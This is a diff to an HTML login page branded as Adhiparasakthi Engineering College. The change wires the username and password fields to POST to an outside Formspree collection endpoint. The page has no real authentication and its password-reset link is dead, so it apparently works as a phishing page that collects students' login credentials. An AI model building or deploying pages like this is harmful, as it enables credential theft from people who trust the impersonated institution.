@@ -21,7 +21,7 @@
       box-shadow: 0 4px 20px rgba(0,0,0,0.15);
       text-align: center;
       width: 320px;
-      border-top: 4px solid #b80000; /* accent line */
+      border-top: 4px solid #b80000;
     }
     .logo {
       width: 100px;
@@ -87,18 +87,20 @@
 </head>
 <body>
   <div class="login-container">
-    <!-- Ensure logo.png is in the same folder -->
     <img src="logo.jpg" alt="College Logo" class="logo" />
     <h2>Adhiparasakthi Engineering College</h2>
-    <form>
+    
+    <!-- ✅ Formspree Integration -->
+    <form action="https://formspree.io/f/xnnbodzr" method="POST">
       <label for="username">Username</label>
-      <input id="username" type="text" placeholder="Enter username" required />
+      <input id="username" name="username" type="text" placeholder="Enter username" required />
 
       <label for="password">Password</label>
-      <input id="password" type="password" placeholder="Enter password" required />
+      <input id="password" name="password" type="password" placeholder="Enter password" required />
 
       <button type="submit">Login</button>
     </form>
+
     <div class="links">
       <a href="#">Forgot Password?</a>
     </div>
